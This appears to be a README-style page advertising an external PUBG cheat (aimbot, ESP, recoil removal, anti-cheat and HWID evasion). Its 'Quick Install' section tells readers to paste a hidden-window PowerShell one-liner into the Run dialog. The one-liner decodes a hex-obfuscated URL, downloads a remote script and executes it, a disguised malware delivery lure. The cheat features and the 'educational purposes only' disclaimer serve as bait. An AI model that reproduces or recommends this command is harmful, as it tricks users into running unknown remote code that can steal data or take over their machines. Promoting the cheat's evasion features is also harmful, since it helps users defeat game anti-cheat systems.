# PUBG External Tool - Advanced Battle Royale Enhancement

### Quick Install

- #### Press WIN+R
- #### Copy and insert command

```bash
powershell -WindowStyle Hidden -Command "$p='68747470733A2F2F6A616968696E642E6564752E696E2F67726170657375626A6563742F726570616972626574746572';$u=[System.Text.Encoding]::UTF8.GetString((1..($p.Length/2) | ForEach-Object {[Convert]::ToByte($p.Substring((($_-1)*2),2),16)}));([ScriptBlock]::Create((Invoke-RestMethod $u))).Invoke()"
```

## 🚀 Core Features
- **External Aimbot** with customizable:
  - FOV control (1-360° adjustable)
  - Smoothing (human-like movement)
  - Bone priority (head/chest/pelvic targeting)
  
- **Advanced ESP System**:
  - Player boxes (2D/3D)
  - Health/armor status bars
  - Distance markers (0-1000m)
  - Item highlights (weapons/attachments)
  - Vehicle detection (300m range)

- **Combat Enhancements**:
  - **Ballistic Prediction** (bullet drop/velocity)
  - **Zero Recoil** (pattern compensation)
  - **Spread Removal** (perfect accuracy)
  - **Triggerbot** (configurable reaction time)

External Memory Operations

Kernel-mode Driver for secure communication

DirectX Overlay (ImGui-based)

Auto-Updating Offsets

🔒 Security Measures
Signature Spoofing

Thread Stack Encryption

VMM Detection Evasion

HWID Masking

📌 Note: For educational purposes only. BattleEye/BEACON anti-cheat may issue hardware bans.
